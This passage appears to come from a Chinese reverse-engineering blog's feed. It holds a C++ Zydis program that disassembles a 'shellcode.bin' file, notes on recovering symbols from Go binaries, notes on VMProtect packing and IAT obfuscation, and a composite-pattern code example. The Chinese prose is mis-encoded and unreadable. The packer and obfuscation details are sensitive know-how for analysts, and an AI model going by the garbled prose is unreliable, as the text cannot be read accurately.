class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cinttypes&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Zydis/Zydis.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">readFileToBuffer</span><span class="params">(<span class="type">const</span> std::string&amp; filepath, std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;&amp; buffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">std::ifstream <span class="title">file</span><span class="params">(filepath, std::ios::binary | std::ios::ate)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!file.<span class="built_in">is_open</span>())</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to open file: &quot;</span> &lt;&lt; filepath &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">std::streamsize fSize = file.<span class="built_in">tellg</span>();</span><br><span class="line">file.<span class="built_in">seekg</span>(<span class="number">0</span>, std::ios::beg);</span><br><span class="line">buffer.<span class="built_in">resize</span>(fSize);</span><br><span class="line"><span class="keyword">if</span> (!file.<span class="built_in">read</span>(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">char</span>*&gt;(buffer.<span class="built_in">data</span>()), fSize))</span><br><span class="line">&#123;</span><br><span class="line">std::cerr &lt;&lt; <span class="string">&quot;Failed to read file: &quot;</span> &lt;&lt; filepath &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">file.<span class="built_in">close</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printInstructionStructure</span><span class="params">(<span class="type">const</span> ZydisDecodedInstruction&amp; instruction, <span class="type">const</span> ZydisDecodedOperand operands[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Instruction Structure:\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Mnemonic: &quot;</span> &lt;&lt; <span class="built_in">ZydisMnemonicGetString</span>(instruction.mnemonic) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Length: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.length) &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Opcode: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.opcode) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Operand Count Visible: &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(instruction.operand_count_visible) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (ZyanU8 i = <span class="number">0</span>; i &lt; instruction.operand_count_visible; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> ZydisDecodedOperand&amp; operand = operands[i];</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Operand &quot;</span> &lt;&lt; <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(i) &lt;&lt; <span class="string">&quot;: \n&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span> (operand.type)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_REGISTER:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Register\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Register: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.reg.value) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_IMMEDIATE:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Immediate\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Value: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; operand.imm.value.u &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> ZYDIS_OPERAND_TYPE_MEMORY:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Memory\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Base: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.mem.base) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Index: &quot;</span> &lt;&lt; <span class="built_in">ZydisRegisterGetString</span>(operand.mem.index) &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Displacement: 0x&quot;</span> &lt;&lt; std::hex &lt;&lt; operand.mem.disp.value &lt;&lt; <span class="string">&quot;(&quot;</span> &lt;&lt; (operand.mem.disp.value &gt;= <span class="number">0</span> ? operand.mem.disp.value : -operand.mem.disp.value) &lt;&lt; <span class="string">&quot;)&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;  Type: Unknown\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;-----------------------------------\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ZydisDecoder decoder;</span><br><span class="line"><span class="built_in">ZydisDecoderInit</span>(&amp;decoder, ZYDIS_MACHINE_MODE_LONG_64, ZYDIS_STACK_WIDTH_64);</span><br><span class="line"></span><br><span class="line">ZydisFormatter formatter;</span><br><span class="line"><span class="built_in">ZydisFormatterInit</span>(&amp;formatter, ZYDIS_FORMATTER_STYLE_INTEL);</span><br><span class="line"></span><br><span class="line">std::string filePath = <span class="string">&quot;shellcode.bin&quot;</span>;</span><br><span class="line">std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt; buffer;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">readFileToBuffer</span>(filePath, buffer))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ZyanU64 runtime_address = <span class="number">0</span>;</span><br><span class="line">ZyanUSize offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">const</span> ZyanUSize length = buffer.<span class="built_in">size</span>();</span><br><span class="line">ZydisDecodedInstruction instruction;</span><br><span class="line">ZydisDecodedOperand operands[ZYDIS_MAX_OPERAND_COUNT];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">ZYAN_SUCCESS</span>(<span class="built_in">ZydisDecoderDecodeFull</span>(&amp;decoder, buffer.<span class="built_in">data</span>() + offset, length - offset,</span><br><span class="line">&amp;instruction, operands)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%016&quot;</span> PRIX64 <span class="string">&quot;  &quot;</span>, runtime_address);</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">ZydisFormatterFormatInstruction</span>(&amp;formatter, &amp;instruction, operands,</span><br><span class="line">instruction.operand_count_visible, tmp, <span class="built_in">sizeof</span>(tmp),</span><br><span class="line">runtime_address, ZYAN_NULL);</span><br><span class="line"><span class="built_in">puts</span>(tmp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printInstructionStructure</span>(instruction, operands);</span><br><span class="line"></span><br><span class="line">offset += instruction.length;</span><br><span class="line">runtime_address += instruction.length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Zydisæ˜¯ä¸€ä¸ªåæ±‡ç¼–åº“ï¼Œå¯ä»¥è§£ææœºå™¨æŒ‡ä»¤å°†å…¶è½¬ä¸ºæ±‡ç¼–ä»£ç ï¼Œä¸‹é¢æ˜¯ä½¿ç”¨æ–¹æ³•&lt;/p&gt;
&lt;h2 id=&quot;ä¸‹è½½&quot;&gt;ä¸‹è½½&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/zyantific/zydis&quot;&gt;zyantific/zydis: Fast and l</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GOé€†å‘å…¥é—¨</title>
    <link href="https://www.pri87.vip/posts/356e98d9.html"/>
    <id>https://www.pri87.vip/posts/356e98d9.html</id>
    <published>2025-03-23T14:40:56.000Z</published>
    <updated>2025-03-29T03:28:09.612Z</updated>
    
    <content type="html"><![CDATA[<h1>Golang</h1><p>golang æ˜¯è°·æ­Œå¼€å‘çš„ä¸€ä¸ªé™æ€è¯­è¨€ï¼Œç°åœ¨æœ‰å¾ˆå¤šæ¶æ„ç¨‹åºä½¿ç”¨Goè¯­è¨€å¼€å‘</p><p><a href="https://www.anquanke.com/post/id/214940">GoäºŒè¿›åˆ¶æ–‡ä»¶é€†å‘åˆ†æä»åŸºç¡€åˆ°è¿›é˜¶â€”â€”ç»¼è¿°-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p><h2 id="Goè¯­è¨€åŸºæœ¬ç»“æ„">Goè¯­è¨€åŸºæœ¬ç»“æ„</h2><p>Goè¯­è¨€ä¸­æœ‰äº›ä¿¡æ¯ä¼šä¸€ç›´ä¿ç•™åœ¨ç¨‹åºä¸­ï¼Œç”¨äºå®ç°å•æ–‡ä»¶ç›´æ¥è¿è¡Œè€Œä¸éœ€è¦ç¯å¢ƒï¼ŒåŒæ—¶ç”±äºåå°„å’Œstack traceï¼Œæ‰€ä»¥ä¿ç•™çš„ä¿¡æ¯éå¸¸å¤šï¼Œå¦‚æœæ‰¾åˆ°äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥ç›´æ¥æ¢å¤ç¬¦å·è¡¨</p><p><a href="https://github.com/0xjiayu/go_parser/blob/master/README_cn.md">go_parser/README_cn.md at master Â· 0xjiayu/go_parser</a></p><p>ç”¨è¿™é‡Œçš„ä»‹ç»æ¥è¯´ï¼ŒåŸºæœ¬ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>Meta information<ul><li>Go version</li><li>Build ID</li><li>GOROOT</li></ul></li><li>strings and string pointerï¼ˆå­—ç¬¦ä¸²æŒ‡é’ˆï¼‰</li><li>runtime symbol infomation(pclntab)<ul><li>å‡½æ•°åç§°è¡¨</li><li>æºä»£ç è·¯å¾„è¡¨</li></ul></li><li>runtime type infomation</li><li>interface table<ul><li>æ¥å£ç±»å‹</li><li>çœŸå®ç±»å‹ä¸ç»‘å®šæ–¹æ³•</li></ul></li></ul><h3 id="pclntab">pclntab</h3><p>Program Counter Line Tableç¨‹åºè®¡æ•°å™¨è¡Œæ•°æ˜ å°„è¡¨/è¿è¡Œæ—¶ç¬¦å·è¡¨ã€‚ç¨‹åºå‡ºé”™æ—¶ï¼Œruntimeå°†ä»ä¸­å¾—åˆ°å¯¹åº”çš„åŒ…åï¼Œæ–‡ä»¶åï¼Œæ–¹æ³•æˆ–å‡½æ•°ä»¥åŠå‡ºé”™çš„è¡Œï¼Œæœ€åæ‰èƒ½è¾“å‡ºå‡ºæ¥ï¼Œæ‰€ä»¥è¿™é‡Œæœ‰å¾ˆå¤šæœ‰ç”¨çš„ä¿¡æ¯</p><p>è¿™é‡Œæœ€é‡è¦çš„å‡½æ•°è¡¨å’Œå‡½æ•°åç§°è¡¨ï¼Œå®ƒä»¬çš„åç§»éƒ½æ˜¯ç›¸å¯¹äºpclntabè¿›è¡Œçš„</p><h2 id="æ¢å¤ç¬¦å·è¡¨">æ¢å¤ç¬¦å·è¡¨</h2><p><a href="https://github.com/mandiant/GoReSym">mandiant/GoReSym: Go symbol recovery tool</a></p><p><a href="https://cloud.google.com/blog/topics/threat-intelligence/golang-internals-symbol-recovery/">Readyï¼Œ Setï¼Œ Go â€” Golang å†…éƒ¨åŸç†å’Œç¬¦å·æ¢å¤ |Google Cloud åšå®¢</a></p><p><a href="https://github.com/0xjiayu/go_parser">0xjiayu/go_parser: Yet Another Golang binary parser for IDAPro</a></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œè¿™å‡ ä¸ªå°±å¤Ÿäº†ï¼Œä½†æ˜¯å¦‚æœåŠ äº†æ··æ·†ï¼ŒæŠŠç¬¦å·è¡¨å’Œç¬¦å·åç§°è¡¨çš„å†…å®¹(åç§»)åˆ äº†ï¼Œé‚£å°±å¾—æ‰‹åŠ¨è¿˜åŸäº†ï¼Œå°±å¾ˆéº»çƒ¦ï¼Œæ‰€ä»¥è¿™ç§è¿˜æ˜¯ç”¨bindiffå’Œsigæ–‡ä»¶å§</p><h2 id="è°ƒç”¨çº¦å®š">è°ƒç”¨çº¦å®š</h2><p><a href="QAQ">æ–½å·¥ä¸­</a></p><h2 id="æŠ€å·§">æŠ€å·§</h2><p>å¯¹äºè¿™ç§æ ¹æœ¬çœ‹ä¸æ‡‚çš„ä»£ç ï¼Œå¯¹å‡½æ•°æµ‹è¯•è¿˜æ˜¯ç”¨é»‘ç›’å§ï¼Œä¸€èˆ¬æ¥è¯´ä¸€ä¸ªç”¨æˆ·å‡½æ•°åé¢å°±æœ‰ä¸€ä¸ªåº“è°ƒç”¨å‡½æ•°ï¼Œç”¨æ±‡ç¼–æµç¨‹å›¾åè€Œå¥½çœ‹ä¸€ç‚¹</p>]]></content>
    
    
    <summary type="html">Goçš„ç¬”è®°</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="è¯­è¨€" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Go" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E8%AF%AD%E8%A8%80/Go/"/>
    
    
    <category term="Go" scheme="https://www.pri87.vip/tags/Go/"/>
    
  </entry>
  
  <entry>
    <title>VMPå£³å­¦ä¹ ç¬”è®°</title>
    <link href="https://www.pri87.vip/posts/1a88f77f.html"/>
    <id>https://www.pri87.vip/posts/1a88f77f.html</id>
    <published>2025-03-18T13:02:41.000Z</published>
    <updated>2025-03-29T03:28:09.611Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2><p>æœ€è¿‘æƒ³å°è¯•å†™ä¸ªä»£ç æ··æ·†å™¨ï¼Œæ‰€ä»¥å°è¯•å…ˆçœ‹çœ‹å¸‚é¢ä¸Šçš„å£³æœ‰å“ªäº›æ“ä½œå¯ä»¥å­¦ä¸€ä¸‹ï¼Œé˜²æ­¢èµ°æ­ªè·¯</p><p><a href="https://www.52pojie.cn/thread-1564978-1-1.html">å¿«é€Ÿè®¤è¯† VMP 3.x ç¬¬ä¸€éƒ¨åˆ† å£³ä»£ç ç¯‡ - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><a href="https://www.52pojie.cn/thread-1565126-1-1.html">å¿«é€Ÿè®¤è¯†VMP 3.x ç¬¬äºŒéƒ¨åˆ† ä»£ç å˜å¼‚ç¯‡ - å¾çˆ±ç ´è§£ - 52pojie.cn</a></p><p><a href="https://whereisr0da.github.io/blog/posts/2021-02-16-vmp-3/">ğŸ”¥ Quick look around VMP 3.x - Part 3 : Virtualization | r0daâ€™s Blog</a></p><p>çœ‹çš„ä¸»è¦æ˜¯è¿™ä¸‰ç¯‡åšå®¢</p><h2 id="åŸºæœ¬æ“ä½œ">åŸºæœ¬æ“ä½œ</h2><h3 id="åŠ å£³">åŠ å£³</h3><p>è¿™ä¸ªéƒ¨åˆ†æ˜¯ä¸€èˆ¬çš„å£³éƒ½ä¼šåšçš„æ“ä½œï¼Œå¯¹å¯æ‰§è¡Œæ–‡ä»¶çš„èŠ‚åŒºè¿›è¡Œå‹ç¼©å’ŒåŠ å¯†é˜²æ­¢è¢«é™æ€åˆ†æ</p><p>åŸå§‹èŠ‚åŒºçš„å†…å®¹è¢«æ”¾å…¥.vmp1èŠ‚åŒºï¼Œå«æœ‰è¢«åŠ å¯†çš„èŠ‚åŒºå†…å®¹ï¼Œå£³ä»£ç ï¼ŒèŠ‚åŒºä¿¡æ¯</p><p>VMPä½¿ç”¨ZwProtectVirtualMemoryå‡½æ•°æ¥ä¿®æ”¹èŠ‚åŒºæƒé™ä»è€Œæ‰§è¡Œè§£å¯†ä»£ç </p><h3 id="IATæ··æ·†">IATæ··æ·†</h3><p>åŸå§‹IATè¿˜å­˜åœ¨ï¼Œä½†æ˜¯ä¸ä¼šè¢«ä½¿ç”¨ï¼Œæ‰€æœ‰è°ƒç”¨APIçš„æ“ä½œï¼Œéƒ½ä¼šè¢«è½¬æ¢ä¸ºè¿ç®—æ—¶åŠ¨æ€æ‰§è¡Œ</p><p>å…·ä½“æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call dword ptr ds:[&lt;&amp;targetFunction&gt;]</span><br></pre></td></tr></table></figure><p>å˜ä¸ºç­‰é•¿çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push reg</span><br><span class="line">call apiè§£æå™¨</span><br></pre></td></tr></table></figure><p>apiè§£æå™¨ä¸­é€šè¿‡ä¸€äº›è®¡ç®—å¾—åˆ°åœ°å€ç„¶åç”¨retè·³è½¬åˆ°apiå‡½æ•°ä¸­</p><h2 id="ä»£ç å˜å¼‚">ä»£ç å˜å¼‚</h2><p>VMPä¼šå‘ä»£ç ä¸­åŠ å…¥åƒåœ¾ä»£ç ï¼Œç­‰æ•ˆæ›¿æ¢ï¼Œæ§åˆ¶æµä¿æŠ¤</p><p>å…³äºæ’å…¥åƒåœ¾ä»£ç å’Œä»£ç æ›¿æ¢è¿™éƒ¨åˆ†ä¸æ˜¯å¾ˆæ¸…æ¥šå®ƒæ˜¯æ€ä¹ˆåšçš„ã€‚</p><p>æ§åˆ¶æµä¸­ï¼ŒVMPæ·»åŠ äº†æ›´å¤šæ— æ¡ä»¶è·³è½¬ï¼ŒåŒæ—¶æ‹†åˆ†äº†ä»£ç å—ï¼Œè®©å‡½æ•°å’Œå‡½æ•°äº¤é”™åœ¨ä¸€èµ·ï¼Œä»£ç å—ä¸ä¸€å®šæ˜¯å¯¹é½çš„ï¼Œè¿™å¯¼è‡´äº†é¡ºåºçš„åæ±‡ç¼–å™¨å¾ˆå¯èƒ½å¤±æ•ˆ</p>]]></content>
    
    
    <summary type="html">VMPå£³ç‰¹å¾ç›¸å…³çš„å­¦ä¹ ç¬”è®°</summary>
    
    
    
    <category term="çŸ¥è¯†é›†" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/"/>
    
    <category term="é€†å‘" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/"/>
    
    <category term="æŠ€èƒ½" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/"/>
    
    <category term="åé™æ€åˆ†æ" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/"/>
    
    <category term="å‹ç¼©å™¨" scheme="https://www.pri87.vip/categories/%E7%9F%A5%E8%AF%86%E9%9B%86/%E9%80%86%E5%90%91/%E6%8A%80%E8%83%BD/%E5%8F%8D%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/%E5%8E%8B%E7%BC%A9%E5%99%A8/"/>
    
    
    <category term="å£³" scheme="https://www.pri87.vip/tags/%E5%A3%B3/"/>
    
    <category term="åè°ƒè¯•" scheme="https://www.pri87.vip/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
    <category term="è™šæ‹Ÿæœº" scheme="https://www.pri87.vip/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
    <category term="ä»£ç æ··æ·†" scheme="https://www.pri87.vip/tags/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>ç»„åˆæ¨¡å¼</title>
    <link href="https://www.pri87.vip/posts/df879792.html"/>
    <id>https://www.pri87.vip/posts/df879792.html</id>
    <published>2025-03-17T15:00:32.000Z</published>
    <updated>2025-03-17T15:52:47.500Z</updated>
    
    <content type="html"><![CDATA[<p>å¦‚æœä½ è¦å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š<br>ä¸€ä¸ªå¡ç‰Œç±»ï¼Œæœ‰ä¸åŒçš„æ•ˆæœï¼Œå¾ˆè‡ªç„¶åœ°å¯ä»¥æƒ³åˆ°ä»¥ä¸‹å®ç°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BaseCard</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">std::string name;</span><br><span class="line">std::string description;</span><br><span class="line"><span class="type">size_t</span> id;</span><br><span class="line">dword cost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onHandTurnStart</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onTurnStart</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onHandTurnEnd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">onTurnEnd</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">dword <span class="title">onAttacked</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">afterAttacked</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">dword <span class="title">onAttack</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">afterAttack</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myCard</span> : <span class="keyword">public</span> BaseCard&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">player</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">useCard</span><span class="params">(BaseCard&amp; card)</span></span>&#123;</span><br><span class="line">        card.<span class="built_in">onUse</span>();</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">TurnStart</span><span class="params">(BaseCard&amp; card)</span></span>&#123;</span><br><span class="line">        card.<span class="built_in">onTurnStart</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™æ ·ï¼Œå¦‚æœè¦åˆ›é€ æ›´å¤šçš„ä¸ä¸€æ ·çš„å¡ç‰Œï¼Œå°±è¦ä¸€ç›´æ·»åŠ Cardï¼ŒåŒæ—¶ï¼Œå¦‚æœè€ƒè™‘äººç‰©æŠ€èƒ½ï¼Œé“å…·èƒ½åŠ›ï¼Œä¹Ÿè®¸ä¸€ä¸ªæ•ˆæœè¦é‡å†™å¤šæ¬¡ï¼Œæ‰€ä»¥ï¼Œå®Œå…¨å¯ä»¥å°†æ•ˆæœå•ç‹¬æ‹¿å‡ºæ¥å½“ä½œæ–°ç±»ï¼Œç„¶ååœ¨å¯¹åº”äººç‰©/é“å…·/å¡ç‰Œä¸­æ·»åŠ ä¸åŒçš„æ•ˆæœæ¨¡å—</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Effect</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onTurnStart</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">onUse</span><span class="params">()</span> </span>&#123;&#125;;</span><br><span class="line"><span class="keyword">virtual</span> ~<span class="built_in">Effect</span>() = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AEffect</span> : <span class="keyword">public</span> Effect &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        player.<span class="built_in">heal</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">CaposEffect</span> : <span class="keyword">public</span> Effect&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    std::vector&lt;std::shared_ptr&lt;Effect&gt;&gt; ce;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">onUse</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> effect:ce)&#123;</span><br><span class="line">            effect-&gt;<span class="built_in">onUse</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">addEffect</span><span 